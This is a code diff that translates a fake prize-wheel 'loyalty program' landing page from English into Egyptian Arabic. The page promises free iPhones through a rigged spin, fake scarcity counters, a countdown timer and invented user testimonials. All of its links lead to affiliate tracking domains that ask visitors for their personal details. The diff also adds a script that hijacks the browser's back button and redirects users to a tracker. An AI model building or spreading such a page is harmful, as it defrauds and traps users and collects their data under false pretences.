@@ -1,12 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<!DOCTYPE html><html lang="en-za"><head>
   <base href="">
   <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
   <meta name="robots" content="noindex, nofollow, noarchive">
   <meta name="referrer" content="no-referrer">
   <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
-  <title>Congratulations!</title>
+  <title>!مبروك</title>
   <meta content="notranslate" name="google">
   <link id="favicon" rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEG0lEQVQ4EQEQBO/7AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/7+0IA5eWVAPX1HQDHxwYAAAAAADo6+gAKCuMAFxdpAQkJwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/yMhY/9HR8P9DQ///zs7///z8////////ICD//w4O///U1PH/w8NVAAAAAAQAoNb/AAAAAAAAAAAAAAAAQhcJAPIG8gAOLy8AAEVFAADMzAAAAQEAADAwAAAAAAAA8vIAACwsDgDU1Jz/9/fqAgAAAAAAAAAAAAAAAAAAAACVH/8ADj06AAAAAAAAu7sAAGZmAADZ2QAAAAAAAAAAAAAAAAAAAAAAADs7DgDo6JcCAAAAAAAAAAAAAAAAMxMIAB399wAA9fUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8fEAAPj4HwIAAAAAAAAAAAAAAAAzEwgABsnIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxsYFAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAzO34APo4OQAAAAAAAAAAAAAfHwAAZGQAACIiAAAAAAAAV1cAAE5OAAAAAAAAAAAAADo6+wIAAAAAAAAAAAAAAADO7fgA4wIIAAAODgAAAAAAADExAACbmwAANTUAAAAAAACIiAAAenoAAAAAAAAREQAABwfhAQCg1v8AAAAAAAAAAAAAAABAFggAsRr1AA4wLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANbW8wAhIUoCAAAAAAAAAAAAAAAAAAAAAMDq+ABk3PwA8tHUAAAPDwAAAAAAAAAAAAAAAAAAAAAAABERAPPT1gAA6OhhAQkJxAEAoNb/AAAAAAAAAAAAAAAAAAAAAAAAAAA/FggAlx//AB8B+wAFx8YAAAAAAPs5OgDh/gUAZuEBAMRLIgEAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMHq+AAq6gAAMBIIADUpSAAAAAAAy9z4ANDu+AAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQ7vgA0O74AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA0ZQtaGpDlQAAAABJRU5ErkJggg==" type="image/png" sizes="16x16">
   <script>
@@ -21,9 +19,8 @@
       var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
         h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
       1 == b && (f = 0);
-      var d = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
-        g = ["January", "February", "March", "April", "Maybe", "June", "July", "August", "September", "October",
-          "November", "December"
+      var d = ["الأحد", "الاثنين", "يوم الثلاثاء", "الأربعاء", "يوم الخميس", "جمعة", "السبت"],
+        g = ["يناير", "شهر فبراير", "مارس", "أبريل", "يمكن", "يونيو", "تموز", "أغسطس", "سبتمبر", "اكتوبر", "شهر نوفمبر", "ديسمبر"
         ];
       return null != !c && 0 != !c && void 0 != !c ? h.getDate() + " " + g[h.getMonth()] : "day_name_only" == c && b ?
         d[h.getDay()] : "top_date" == c && b ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h
@@ -39,8 +36,7 @@
 
 #wheelCon,
 .icon,
-.menu,
-.logo {
+.menu {
     background-repeat: no-repeat;
     background-size: contain
 }
@@ -54,8 +50,7 @@
 #pressButton,
 #wheelCon,
 .icon,
-.menu,
-.logo {
+.menu {
     background-size: contain
 }
 
@@ -134,12 +129,9 @@ ul {
 
 #firstpage {
     margin-bottom: 5px;
-    padding: 5px 10px;
-    position: relative;
+    padding: 5px 10px
 }
-#secondpage {
-  position: relative;
-}
+
 #subheadline {
     font-weight: 400;
     line-height: 15px
@@ -917,31 +909,16 @@ ul {
         -webkit-text-size-adjust: none
     }
 }
-
-.logo {
-    /*background-image: url(ltwlogo.jpg);*/
-    width: 100px;
-    height: 50px;
-    position: absolute;
-    left: 0;
-    top: 0;
-}
-.span-second{
-  padding-top: 15px;
-  display: inline-block;
-}
-  </style> 
+  </style>
 </head>
 
 <body oncontextmenu="return!1" onload="setButtonHeight(),autospin1()">
   <div id="header">
     <span class="menu"></span>
-
-    <h3><span id="headline">LOYALTY PROGRAM</span></h3><span class="icon"></span>
+    <h3><span id="headline">برنامج كسب النقاط</span></h3><span class="icon"></span>
   </div>
   <div id="container">
     <div align="center" id="firstpage">
-      <span class="logo"></span>
       <div class="date" id="topDate" style="padding-bottom:10px;margin:0">
         <script>
           document.write(dateOffset(0, "top_date"));
@@ -949,59 +926,53 @@ ul {
       </div>
       <div style="margin-bottom:2px">
         <div id="subheadline">
-          <p style="font-size:18px"><b>Congratulations!</b></p>
-          <p style="padding-top:10px">Today you are lucky!</p>
+          <p style="font-size:18px"><b>!مبروك</b></p>
+          <p style="padding-top:10px">انهردة انت محظوظ!</p>
         </div>
         <div class="intro" style="padding-top:5px">
-          Every <span id="today">
-            <script>
-              document.write(dateOffset(0, "day_name_only"));
-            </script>
-          </span> we select 7
-          <script>
-            document.write(getURLParameter("browser"));
-          </script>Chrome Mobile Browser users to give them the opportunity to win prizes from our sponsors. Turn the
-          wheel to see which prize you will receive!
+          انهردة بنقدم للمستخدمين الفرصة لكسب الجوايز من الكفلاء. لف العجلة عشان نشوف جايزتك
         </div>
         <div id="wheelCon">
           <img class="spinAround2 transparent" height="501" id="wheel" src="pw_i11.png" width="501"> <input id="pressButton" onclick="spin()" style="top: 106.2px;" type="button">
-          <div><img class="animated rotateIn" id="devMockup" src="i11o.png" style="display: hidden; left: 64px; top: 42px;"></div>
+          <div><img class="animated rotateIn" id="devMockup" src="phone.png" style="display: hidden; left: 64px; top: 42px;"></div>
         </div>
       </div>
       <div id="secondpage">
-        <span class="logo"></span>
         <div class="congrats">
           <h4>
-            <a href="https://coogletrck3.com/click.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer">
-              <font color="#3C5A96">Congratulations!<br> <span class="span-second"> You have the chance to win the new iPhone 13 Pro!</span></font>
+            <a href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer">
+              <font color="#3C5A96">!مبروك<br> !تقدر دلوقتى تكسب ايفون برو١١ </font>
             </a>
           </h4>
         </div>
         <div class="congrats" style="text-align:left">
           <ol>
-            <li>Choose a color that you would like. You will be redirected to our sponsor's website</li>
-            <li>On the sponsor's website, complete the process to stand the chance to win</li>
+            <li>ختار اللون المفضل ليك و هيتم تحويلك لموقع</li>
+            <li>دخل بياناتك عشان تضمن انك تكسب الجايزة</li>
           </ol>
-          <b>IMPORTANT:</b> Gifts can end anytime, choose faster!
+          <b>:مهم</b>!الجوايز ممكن تخلص فى اى وقت .اختار بسرعة
         </div>
-        <div class="timer">Offer valid for
-          <font color="red"><b><span id="mins">4</span> minutes and <span id="hsecs">59</span> seconds</b></font>
+        <div class="timer">العرض سارى لمدة
+          <font color="red"><b> ثانية<span id="hsecs">٥٩</span> دقايق و <span id="mins">٤</span></b></font>
         </div>
         <div class="prize">
           <table>
             <tbody>
               <tr>
                 <th></th>
-                <td style="padding:10px 5px 10px 0;text-align:center"><img src="i11-s.png" style="max-width:100px"></td>
+                <td style="padding:10px 5px 10px 0;text-align:center"><img src="phone-0.jpg" style="max-width:100px"></td>
                 <td style="line-height:1.6">
-                  <p style="text-align:left"><a href="https://coogletrck3.com/click.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"><span class="name">iPhone 13 Pro 128GB
-                        (Graphite)</span></a></p>
-                  <p><span class="smallfont">6.1", OLED Display with ProMotion</span></p>
-                  <p class="regular_price">Retail price: <s class="red_text">
-                      R 21499
-                    </s></p>
+                  <p style="text-align:left"><a href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"><span class="name">ايفون ١١ برو ٦٤ جيجا بايت (فضى)</span></a></p>
+                  <p><span class="smallfont">٥.٨ شاشة عرض رتينا مميزة</span></p>
+                  <p class="regular_price"><s class="red_text">
+                    ٢٠،٤٩٩
+                  </s>:سعر التجزئة </p>
+                  <p class="your_price"><span>
+                    ٠ (مجانا)
+                  </span>:السعر المتاح </p>
+                  <p class="remaining"><b><span>١</span>:المتاح </b></p>
                   <div>
-                    <a class="button" href="https://coogletrck3.com/click.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"> Choose </a>
+                    <a class="button" href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"> اختار </a>
                   </div>
                 </td>
               </tr>
@@ -1013,16 +984,19 @@ ul {
             <tbody>
               <tr>
                 <th></th>
-                <td style="padding:10px 5px 10px 0;text-align:center"><img src="i11-g.png" style="max-width:100px"></td>
+                <td style="padding:10px 5px 10px 0;text-align:center"><img src="phone-1.jpg" style="max-width:100px"></td>
                 <td style="line-height:1.6">
-                  <p style="text-align:left"><a href="https://coogletrck3.com/click.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"><span class="name">iPhone 13 Pro 128GB
-                        (Sierra Blue)</span></a></p>
-                  <p><span class="smallfont">6.1", OLED Display with ProMotion</span></p>
-                  <p class="regular_price">Retail price: <s class="red_text">
-                      R 21499
-                    </s></p>
+                  <p style="text-align:left"><a href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"><span class="name">ايفون ١١ برو ٦٤ جيجا بايت (فضى سماوى)</span></a></p>
+                  <p><span class="smallfont">٥.٨ شاشة عرض رتينا مميزة</span></p>
+                  <p class="regular_price"><s class="red_text">
+                      ٢٠،٤٩٩
+                    </s>:سعر التجزئة </p>
+                <p class="your_price"><span>
+                    ٠ (مجانا)
+                  </span>:السعر المتاح </p>
+                  <p class="remaining"><b><span>٣</span>:المتاح </b></p>
                   <div>
-                    <a class="button" href="https://coogletrck3.com/click.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"> Choose </a>
+                    <a class="button" href="https://singapore.affiliateplanet.cc/cajjl4k.php?lp=1" style="cursor:pointer!important"  PreventExitPop="false" rel="noreferrer"> اختار </a>
                   </div>
                 </td>
               </tr>
@@ -1035,13 +1009,13 @@ ul {
       <div class="comments">
         <div class="wi_like_wrap border_bottom">
           <span class="like_people"><span class="like_people_images"><span class="like_people_image_wrap"><img class="like_people_image" height="24" src="like_user_1.jpg" width="24"></span> <span class="like_people_image_wrap"><img class="like_people_image" height="24" src="like_user_2.jpg" width="24"></span></span>
-            <span class="like_people_text">1537 people like this</span></span>
+            <span class="like_people_text">١٥٣٧ اعجبهم ذلك</span></span>
         </div>
         <div class="wi_buttons border_bottom">
           <div class="wi_buttons_wrap">
-            <span class="like_wrap"><span class="item_like _i"><i class="i_like"></i> <b class="v_like">1537</b></span>
-              <span class="item_share is_empty _i"><i class="i_share"></i> <b class="v_share">234</b></span></span>
-            <span class="item_views"><i class="i_views"></i> <b class="v_views">544K</b></span>
+            <span class="like_wrap"><span class="item_like _i"><i class="i_like"></i> <b class="v_like">١٥٣٧</b></span>
+              <span class="item_share is_empty _i"><i class="i_share"></i> <b class="v_share">٢٣٤</b></span></span>
+            <span class="item_views"><i class="i_views"></i> <b class="v_views">٥٤٤ الف</b></span>
           </div>
         </div>
         <center>
@@ -1051,15 +1025,14 @@ ul {
               <tr>
                 <td align="right" class="photo_avatar" valign="top" width="40"><img src="za17.jpg"></td>
                 <td align="left" valign="top">
-                  <div class="comment_name">Ramir Lassiter</div>
-                  <div class="comment_text">Dropped iPhone 13 Pro! Honestly, I wanted the iMac, but not today ...</div>
+                  <div class="comment_name">لاستير</div>
+                  <div class="comment_text">كسبت اى فون ١١ برو ! بأمانة كان نفسى اكسب اى ماك بس فرصة تانية</div>
                   <div class="comments__item__meta">
-                    <div class="item_date">Yesterday at 08:13
-                    </div>
+                    <div class="item_date">أمس الساعة ١٣:٠٨</div>
                   </div>
                   <div class="pi_links">
-                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
-                      <span>Comment</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
                   </div>
                 </td>
               </tr>
@@ -1071,8 +1044,8 @@ ul {
               <tr>
                 <td align="right" class="photo_avatar" valign="top" width="40"><img src="za12.jpg"></td>
                 <td align="left" valign="top">
-                  <div class="comment_name">Tony Hobbs</div>
-                  <div class="comment_text">I won 1 free spin, but I did not win a prize. Can I get another chance?
+                  <div class="comment_name">تونى هوبس</div>
+                  <div class="comment_text">انا كسبت لف العجلة مرة مجانا لكن مكسبتش الجايزة .ممكن اجرب تانى؟
                   </div>
                   <div class="comments__item__meta">
                     <div class="item_date">
@@ -1082,8 +1055,8 @@ ul {
                     </div>
                   </div>
                   <div class="pi_links">
-                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
-                      <span>Comment</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
                   </div>
                 </td>
               </tr>
@@ -1095,8 +1068,8 @@ ul {
               <tr>
                 <td align="right" class="photo_avatar" valign="top" width="40"><img src="za13.jpg"></td>
                 <td align="left" valign="top">
-                  <div class="comment_name">Ratko Monroe</div>
-                  <div class="comment_text">I just unpacked the new iMac! This is the best prize of all!
+                  <div class="comment_name">راتكو مونرو</div>
+                  <div class="comment_text">انا اخترت اى ماك دلوقتى! دى حقيقى افضل جايزة!
                   </div>
                   <div class="comments__item__meta">
                     <div class="item_date">
@@ -1106,8 +1079,8 @@ ul {
                     </div>
                   </div>
                   <div class="pi_links">
-                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
-                      <span>Comment</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
                   </div>
                 </td>
               </tr>
@@ -1119,9 +1092,8 @@ ul {
               <tr>
                 <td align="right" class="photo_avatar" valign="top" width="40"><img src="za14.jpg"></td>
                 <td align="left" valign="top">
-                  <div class="comment_name">Marta Irvin</div>
-                  <div class="comment_text">At first I thought it was a joke, but this morning I was delivered a new
-                    iPhone 13 Pro, I also got a T-shirt with a logo!
+                  <div class="comment_name">مارتا ارفن</div>
+                  <div class="comment_text">فى الاول كنت فاكرة انة مش حقيقى لكن انهردة الصبح استلمت الايفون برو ١١ و تى شيرت علية الشعار كمان.
                   </div>
                   <div class="comments__item__meta">
                     <div class="item_date">
@@ -1131,8 +1103,8 @@ ul {
                     </div>
                   </div>
                   <div class="pi_links">
-                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
-                      <span>Comment</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
                   </div>
                 </td>
               </tr>
@@ -1144,8 +1116,8 @@ ul {
               <tr>
                 <td align="right" class="photo_avatar" valign="top" width="40"><img src="za15.jpg"></td>
                 <td align="left" valign="top">
-                  <div class="comment_name">Suzana Tucker</div>
-                  <div class="comment_text">My iMac arrived this morning! I love it!!!
+                  <div class="comment_name">سوزانا تاكر</div>
+                  <div class="comment_text">ستلمت اى ماك بتاعى انهردة الصبح. جميل جدا !
                   </div>
                   <div class="comments__item__meta">
                     <div class="item_date">
@@ -1155,8 +1127,8 @@ ul {
                     </div>
                   </div>
                   <div class="pi_links">
-                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
-                      <span>Comment</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
                   </div>
                 </td>
               </tr>
@@ -1168,8 +1140,8 @@ ul {
               <tr>
                 <td align="right" class="photo_avatar" valign="top" width="40"><img src="za16.jpg"></td>
                 <td align="left" valign="top">
-                  <div class="comment_name">Margareta Hobson</div>
-                  <div class="comment_text">I won the iPad. I still do not believe that this is true!
+                  <div class="comment_name">مارجريتا هوبسون</div>
+                  <div class="comment_text">كسبت الاى باد ! مش قادرة اصدق ان دة حصل بجد !
                   </div>
                   <div class="comments__item__meta">
                     <div class="item_date">
@@ -1179,8 +1151,8 @@ ul {
                     </div>
                   </div>
                   <div class="pi_links">
-                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
-                      <span>Comment</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
                   </div>
                 </td>
               </tr>
@@ -1192,8 +1164,8 @@ ul {
               <tr>
                 <td align="right" class="photo_avatar" valign="top" width="40"><img src="za11.jpg"></td>
                 <td align="left" valign="top">
-                  <div class="comment_name">Dalibor Rollins</div>
-                  <div class="comment_text">I won the ipad, but I already have it, can I change the prize on the iMac?
+                  <div class="comment_name">داليبور روبنز</div>
+                  <div class="comment_text">انا كسبت اى باد بس عندى واحد. ممكن ابدل الجايزة واخد اى ماك؟
                   </div>
                   <div class="comments__item__meta">
                     <div class="item_date">
@@ -1203,8 +1175,8 @@ ul {
                     </div>
                   </div>
                   <div class="pi_links">
-                    <span class="like_wrap"><span class="pi_link">Like</span></span> <span class="pi_reply_wrap">·
-                      <span>Comment</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
+                    <span class="like_wrap"><span class="pi_link">يحب</span></span> <span class="pi_reply_wrap">·
+                      <span>تعليق</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span>
                   </div>
                 </td>
               </tr>
@@ -1216,12 +1188,12 @@ ul {
             </tbody>
           </table>
           <div class="show_next_wrap">
-            <span class="show_next">See all</span>
+            <span class="show_next">اظهار الكل</span>
           </div>
         </center>
       </div>
     </div>
-    <div class="fixed_footer"><img alt="" class="clip" src="clip_footer_3.png"> <input class="footer_input" placeholder="Your message" type="text"> <img alt="" class="btn_send" src="footer_right.png"></div>
+    <div class="fixed_footer"><img alt="" class="clip" src="clip_footer_3.png"> <input class="footer_input" placeholder="رسالتك" type="text"> <img alt="" class="btn_send" src="footer_right.png"></div>
   </div>
   <script type="text/javascript">
     var page = ("page"),
@@ -1253,7 +1225,7 @@ ul {
       switch (count) {
         case 1:
           button.disabled = !0, dWheel.className = "spinAround", setTimeout(function () {
-            button.disabled = !1, alert("You have an extra try!\n\nTry again!"), autospin2()
+            button.disabled = !1, alert("  !عندك فرصة تانية \n\n !تقدر تحاول تانى"), autospin2()
           }, 6800);
           break;
         case 2:
@@ -1278,7 +1250,7 @@ ul {
 
     function autospin1() {
       alert(
-        'Congratulations!\n\nYou are one of the 7 people selected to participate in our loyalty program! You can get 1 gift out of 4!\n\nClick "OK" to start!'
+        '!مبروك\n\nانت واحد من ضمن ٧ اشخاص تم اختيارهم للمشاركة فى برنامجنا لكسب النقاط  وتقدر تكسب جايزة من اصل اربع جوايز. \n\nدوس "اوك" لنبدأ '
         ), document.getElementById("pressButton").click()
     }
 
@@ -1292,4 +1264,12 @@ ul {
         "hsecs").textContent = a
     };
   </script>
+<script>
+	window.history.pushState({ page: 1 }, '', '');
+	window.onpopstate = function(event) {
+		if (event) {
+			window.location.href = 'https://coogletrck3.com/click.php?key=0lp9k1kle3m19wqtwn9o';
+		}
+	}
+</script>
 </body></html>
